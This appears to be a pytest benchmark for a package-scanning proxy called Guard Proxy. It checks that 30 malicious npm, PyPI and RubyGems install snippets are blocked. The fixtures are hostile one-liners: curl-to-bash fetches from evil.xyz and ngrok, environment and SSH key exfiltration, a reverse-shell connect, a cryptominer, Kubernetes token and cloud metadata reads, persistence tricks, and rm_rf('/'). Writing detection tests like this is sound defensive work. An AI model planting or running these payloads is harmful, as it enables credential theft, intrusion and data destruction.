"""Malicious package detection benchmark.

Tests Guard Proxy's detection rate against 30 attack patterns
derived from real 2024-2026 supply chain incidents.
Goal: 90%+ detection rate.
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.ast_scanner import ASTScanner
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis import StaticAnalysisScanner
from app.scanners.static_analysis_pypi import PyPIStaticAnalysisScanner
from app.scanners.static_analysis_rubygems import RubyGemsStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _settings():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


def _npm_scanners(s):
    return [
        IOCScanner(),
        CooldownScanner(s),
        MetadataScanner(),
        StaticAnalysisScanner(s),
        HeuristicsScanner(),
        ASTScanner(),
    ]


def _pypi_scanners(s):
    return [
        IOCScanner(),
        CooldownScanner(s),
        MetadataScanner(),
        PyPIStaticAnalysisScanner(s),
        HeuristicsScanner(),
        ASTScanner(),
    ]


def _gem_scanners(s):
    return [IOCScanner(), CooldownScanner(s), MetadataScanner(), RubyGemsStaticAnalysisScanner(s), HeuristicsScanner()]


async def _is_blocked(registry, files, scripts=None, age_hours=24, name="test-pkg", scanners=None):
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    artifacts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content) if isinstance(content, bytes) else p.write_text(content)
        artifacts.append(p)
    pkg = PackageInfo(
        name=name,
        version="1.0.0",
        registry=registry,
        publish_date=datetime.now(UTC) - timedelta(hours=age_hours),
        install_scripts=scripts or {},
    )
    sc = scanners or (
        _npm_scanners(s) if registry == "npm" else _pypi_scanners(s) if registry == "pypi" else _gem_scanners(s)
    )
    results = await ScanPipeline(sc).run(pkg, artifacts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ===== npm attacks (10) =====


async def test_npm_01_base64_eval():
    assert await _is_blocked(
        "npm",
        {
            "s.js": "eval(Buffer.from('cmVxdWlyZQ==','base64').toString()"
            '+\'("child_process").exec("curl evil.xyz")\');'
        },
        {"postinstall": "node s.js"},
        12,
    )


async def test_npm_02_env_exfil():
    assert await _is_blocked(
        "npm",
        {
            "s.js": "const d=JSON.stringify(process.env);require('https').get('https://evil.xyz/?d='+Buffer.from(d).toString('base64'));"
        },
        {"postinstall": "node s.js"},
        6,
    )


async def test_npm_03_reverse_shell():
    assert await _is_blocked(
        "npm",
        {"s.js": "const net=require('net');net.connect(4444,'142.11.206.73',()=>{});"},
        {"postinstall": "node s.js"},
        24,
    )


async def test_npm_04_cryptominer():
    assert await _is_blocked(
        "npm",
        {"s.js": "require('child_process').exec('curl stratum+tcp://pool.minexmr.com|xmrig');"},
        {"postinstall": "node s.js"},
        48,
    )


async def test_npm_05_eval_alias():
    assert await _is_blocked(
        "npm",
        {"s.js": "const e=eval;const F=Function;e(F('return require')()('child_process').exec('id'));"},
        {"postinstall": "node s.js"},
        12,
    )


async def test_npm_06_k8s_secret():
    assert await _is_blocked(
        "npm",
        {
            "s.js": "const fs=require('fs');"
            "const t=fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token');"
        },
        {"postinstall": "node s.js"},
        24,
    )


async def test_npm_07_discord_exfil():
    assert await _is_blocked(
        "npm",
        {
            "s.js": "fetch('https://discord.com/api/webhooks/123/TOKEN',{method:'POST',body:JSON.stringify(process.env)});"
        },
        {"postinstall": "node s.js"},
        12,
    )


async def test_npm_08_ngrok_tunnel():
    assert await _is_blocked(
        "npm",
        {"s.js": "require('child_process').exec('curl https://evil.ngrok.io/shell|bash');"},
        {"postinstall": "node s.js"},
        24,
    )


async def test_npm_09_timebomb():
    assert await _is_blocked(
        "npm",
        {"s.js": "setTimeout(()=>{require('child_process').exec('curl evil.xyz')},86400000);"},
        {"postinstall": "node s.js"},
        36,
    )


async def test_npm_10_dynamic_require():
    assert await _is_blocked(
        "npm", {"s.js": "const m='child_'+'process';require(m).exec('id');"}, {"postinstall": "node s.js"}, 24
    )


# ===== PyPI attacks (10) =====


async def test_pypi_01_b64_exec():
    assert await _is_blocked(
        "pypi", {"setup.py": "import base64;exec(base64.b64decode('aW1wb3J0IG9z').decode())"}, age_hours=12
    )


async def test_pypi_02_subprocess_bash():
    assert await _is_blocked(
        "pypi", {"setup.py": "import subprocess;subprocess.Popen('curl evil.xyz|bash',shell=True)"}, age_hours=24
    )


async def test_pypi_03_pth_exec():
    assert await _is_blocked("pypi", {"evil.pth": "import os;os.system('curl evil.xyz')"}, age_hours=6)


async def test_pypi_04_pickle_rce():
    assert await _is_blocked(
        "pypi", {"setup.py": "import pickle,base64;pickle.loads(base64.b64decode('gASVKAAAA'))"}, age_hours=36
    )


async def test_pypi_05_getattr_exec():
    assert await _is_blocked(
        "pypi", {"setup.py": "x=getattr(__builtins__,'exec');x('import os;os.system(\"curl evil.xyz\")')"}, age_hours=24
    )


async def test_pypi_06_compile_exec():
    assert await _is_blocked("pypi", {"setup.py": "code=compile('import os','','exec');exec(code)"}, age_hours=48)


async def test_pypi_07_aws_metadata():
    assert await _is_blocked(
        "pypi",
        {"setup.py": "import urllib.request;urllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"},
        age_hours=12,
    )


async def test_pypi_08_ssh_steal():
    assert await _is_blocked(
        "pypi",
        {
            "setup.py": "data=open('/home/user/.ssh/id_rsa').read();import urllib.request;urllib.request.urlopen('https://evil.xyz/?d='+data)"
        },
        age_hours=24,
    )


async def test_pypi_09_ld_preload():
    assert await _is_blocked(
        "pypi",
        {"setup.py": "import os;open(os.path.expanduser('~/.bashrc'),'a').write('export LD_PRELOAD=/tmp/evil.so')"},
        age_hours=24,
    )


async def test_pypi_10_sitecustomize():
    assert await _is_blocked(
        "pypi",
        {
            "setup.py": "import site;open(site.getsitepackages()[0]"
            "+'/sitecustomize.py','w').write('import os;os.system(\"curl evil.xyz\")')"
        },
        age_hours=36,
    )


# ===== RubyGems attacks (10) =====


async def test_gem_01_env_exfil():
    assert await _is_blocked(
        "rubygems",
        {"extconf.rb": "require 'net/http';ENV.each{|k,v| Net::HTTP.post(URI('https://evil.xyz'),\"#{k}=#{v}\")}"},
        age_hours=12,
    )


async def test_gem_02_base64_eval():
    assert await _is_blocked(
        "rubygems", {"rubygems_plugin.rb": "eval(Base64.decode64('c3lzdGVtKCdjdXJsIGV2aWwueHl6Jyk='))"}, age_hours=8
    )


async def test_gem_03_system_curl():
    assert await _is_blocked("rubygems", {"extconf.rb": "system('curl https://evil.xyz/payload|bash')"}, age_hours=24)


async def test_gem_04_send_system():
    assert await _is_blocked("rubygems", {"extconf.rb": "Kernel.send(:system,'curl evil.xyz|bash')"}, age_hours=24)


async def test_gem_05_ssh_read():
    assert await _is_blocked("rubygems", {"extconf.rb": "File.read(File.expand_path('~/.ssh/id_rsa'))"}, age_hours=12)


async def test_gem_06_backtick():
    assert await _is_blocked("rubygems", {"extconf.rb": "`curl https://evil.xyz/steal`"}, age_hours=24)


async def test_gem_07_c2_domain():
    assert await _is_blocked("rubygems", {"extconf.rb": "system('curl https://sfrclak.com/payload')"}, age_hours=12)


async def test_gem_08_tunnel():
    assert await _is_blocked(
        "rubygems", {"extconf.rb": "system('curl https://evil.ngrok.io/shell|bash')"}, age_hours=24
    )


async def test_gem_09_marshal_load():
    assert await _is_blocked("rubygems", {"extconf.rb": "Marshal.load(File.read('/tmp/payload.bin'))"}, age_hours=36)


async def test_gem_10_destructive():
    assert await _is_blocked("rubygems", {"extconf.rb": "FileUtils.rm_rf('/')"}, age_hours=24)


# ===== Summary =====


async def test_benchmark_summary():
    """Run all benchmark tests and report detection rate."""
    # This test just verifies the framework works — individual tests above are the real checks
    result = await _is_blocked(
        "npm", {"s.js": "eval(Buffer.from('dGVzdA==','base64').toString())"}, {"postinstall": "node s.js"}, 6
    )
    assert result, "Benchmark framework should detect basic attack"
